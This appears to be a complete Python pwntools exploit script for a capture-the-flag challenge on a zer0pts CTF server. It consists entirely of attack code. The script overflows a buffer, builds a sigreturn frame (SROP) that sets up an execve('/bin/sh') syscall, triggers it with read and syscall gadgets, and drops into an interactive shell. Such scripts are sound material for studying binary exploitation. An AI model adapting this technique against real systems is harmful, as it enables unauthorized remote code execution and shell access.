from pwn import *

shadow_stack = 0x600234
binsh = shadow_stack + 0x10
read = 0x4001EA
syscall = 0x400223 

p = remote("pwn.ctf.zer0pts.com", 9011)

payload = "a" * 256 # padding
payload += p64(shadow_stack + 0x100) # rbp

# sigreturn frame for SROP
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(4)
payload += p64(5)
payload += p64(0) #r8
payload += p64(0) #r9
payload += p64(0) #r10
payload += p64(0) #r11
payload += p64(0) #r12
payload += p64(0) #r13
payload += p64(0) #r14
payload += p64(0) #r15
payload += p64(binsh) #rdi
payload += p64(0) #rsi
payload += p64(0) #rbp
payload += p64(0) #rbx
payload += p64(0) #rdx
payload += p64(59) #rax
payload += p64(0) #rcx
payload += p64(shadow_stack + 0x200) #rsp
payload += p64(syscall) #rip
payload += p64(123) #eflags
payload += p64(0x33) #cs
payload += p64(0x33) #gs
payload += p64(0x33) #fs
payload += p64(0x2b) #ss

p.sendlineafter("Data: ", payload)

#control rax with read
#and do SROP with syscall gadget
payload = p64(syscall)
payload += p64(read)
payload += "/bin/sh\x00"

p.sendlineafter("Data: ", payload)

#eax = 15 (sys_rt_sigreturn)
p.sendline(p64(syscall) + "a" * 6)
p.interactive()
